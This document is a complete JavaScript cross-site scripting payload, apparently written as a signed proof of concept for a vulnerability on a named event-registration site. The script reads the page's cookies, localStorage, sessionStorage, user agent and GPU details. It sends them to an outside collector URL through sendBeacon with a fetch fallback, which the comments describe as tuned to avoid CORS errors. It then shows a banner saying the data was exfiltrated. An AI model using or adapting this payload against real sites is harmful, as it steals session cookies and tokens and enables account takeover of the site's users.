// WILD XSS — Raman_MG signature (VULN-36 attend.sophos.com). Collector URL filled at deploy.
// Faithful to the original; only change = persistent Cloudflare collector + reliable exfil
// (sendBeacon primary = fire-and-forget, no CORS error; XHR kept as fallback — collector returns ACAO:* so console stays clean).
(() => {
  const COLLECTOR = "https://rmg-collector.ramanmgg1.workers.dev/"; // e.g. https://rmg-collector.<sub>.workers.dev/
  const c = document.createElement("canvas"),
    g = c.getContext("webgl") || c.getContext("experimental-webgl"),
    i = g && g.getExtension("WEBGL_debug_renderer_info"),
    gpu = i ? g.getParameter(i.UNMASKED_RENDERER_WEBGL) : "N/A",
    vendor = i ? g.getParameter(i.UNMASKED_VENDOR_WEBGL) : "N/A",
    data = {
      origin: location.origin, path: location.pathname, cookies: document.cookie,
      userAgent: navigator.userAgent, localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage }, historyLength: history.length, gpu, vendor
    },
    payload = "msg=" + encodeURIComponent(JSON.stringify(data));
  // primary: sendBeacon (no CORS, survives navigation)
  let sent = false;
  try { sent = navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/x-www-form-urlencoded" })); } catch (e) {}
  // fallback: fetch keepalive (collector returns Access-Control-Allow-Origin:* → clean console)
  if (!sent) {
    try { fetch(COLLECTOR, { method: "POST", mode: "cors", keepalive: true, headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: payload }); } catch (e) {}
  }
  const box = document.createElement("div");
  box.style.cssText = "position:fixed;top:20vh;left:50%;transform:translateX(-50%);background:#111;color:#0f0;border:2px solid #0f0;padding:20px;font-family:monospace;z-index:999999;width:600px;max-width:90%;white-space:pre-wrap;box-shadow:0 0 20px lime;font-size:14px;";
  box.innerText = "=============================\n  WILD XSS EXECUTED\n  BY Raman_MG\n=============================\n\n[Origin]          " + location.origin + "\n[Path]            " + location.pathname + "\n[Cookies]         " + document.cookie.split(";").length + "\n[User-Agent]      " + navigator.userAgent + "\n[LocalStorage]    " + Object.keys(localStorage).length + " keys\n[SessionStorage]  " + Object.keys(sessionStorage).length + " keys\n[History]         " + history.length + " entries\n[GPU]             " + gpu + "\n[Vendor]          " + vendor + "\n\nData exfiltrated to collector";
  document.body.appendChild(box);
})();
